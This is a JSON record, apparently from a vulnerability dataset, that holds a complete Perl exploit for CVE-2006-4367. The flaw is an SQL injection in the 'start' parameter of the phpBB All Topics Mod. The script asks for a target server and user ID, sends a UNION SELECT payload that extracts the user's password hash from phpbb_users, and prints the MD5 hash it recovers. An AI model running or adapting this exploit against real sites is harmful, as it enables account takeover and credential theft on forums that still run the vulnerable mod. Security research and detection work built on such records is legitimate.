{
  "id": "2248",
  "title": "phpBB All Topics Mod 1.5.0 - &#039;start&#039; SQL Injection",
  "cve": "CVE-2006-4367",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nprint q{\r\n_________________________________________________________________________\r\n\r\n\r\n           /      \\\r\n        \\  \\  ,,  /  /\r\n         '-.`\\()/`.-'\r\n        .--_'(  )'_--.\r\n       / /` /`\"\"`\\ `\\ \\           * SpiderZ ForumZ Security *\r\n        |  |  ><  |  |\r\n        \\  \\      /  /\r\n            '.__.'       \r\n\r\n\r\n# Author: SpiderZ\r\n# Exploit: All Topics Hack Sql injection\r\n# For: phpBB ( 2.0.x - 2.0.21 )\r\n# Site: www.spiderz.altervista.org\r\n# Site02: www.spiderz.netsons.org\r\n-------------------------------------------------------------------------\r\nMod download: http://www.phpbbhacks.com/download/2821\r\n-------------------------------------------------------------------------\r\n_________________________________________________________________________\r\n\r\n}; \r\n\r\nuse IO::Socket;\r\n\r\nprint q{\r\n=> Insert URL\r\n=> without ( http )\r\n=> };\r\n$server = <STDIN>;\r\nchop ($server);\r\nprint q{\r\n=> Insert directory\r\n=> es: /forum/ - /phpBB2/\r\n=> };\r\n$dir = <STDIN>;\r\nchop ($dir);\r\nprint q{\r\n=> User ID\r\n=> Number:\r\n=> };\r\n$user = <STDIN>;\r\nchop ($user);\r\nif (!$ARGV[2]) {\r\n}\r\n$myuser = $ARGV[3];\r\n$mypass = $ARGV[4];\r\n$myid = $ARGV[5];\r\n$server =~ s/(http:\\/\\/)//eg;\r\n$path = $dir;\r\n$path .= \"alltopics.php?mode=&order=ASC&start=-1%20UNION%20SELECT%20user_password%20FROM%20phpbb_ users%20where%20user_id=\".$user ;\r\nprint \"\r\nExploit in process...\\r\\n\";\r\n$socket = IO::Socket::INET->new(\r\nProto => \"tcp\",\r\nPeerAddr => \"$server\",\r\nPeerPort => \"80\") || die \"Exploit failed\";\r\nprint \"Exploit\\r\\n\";\r\nprint \"in process...\\r\\n\";\r\nprint $socket \"GET $path HTTP/1.1\\r\\n\";\r\nprint $socket \"Host: $server\\r\\n\";\r\nprint $socket \"Accept: */*\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nprint \"Exploit finished!\\r\\n\\r\\n\";\r\nwhile ($answer = <$socket>)\r\n{\r\nif ($answer =~/(\\w{32})/)\r\n{\r\nif ($1 ne 0) {\r\nprint \"MD5-Hash is: \".$1.\"\\r\\n\";\r\n}\r\nexit();\r\n}\r\n}\r\n\r\n# milw0rm.com [2006-08-23]",
  "url": "https://www.exploit-db.com/exploits/2248"
}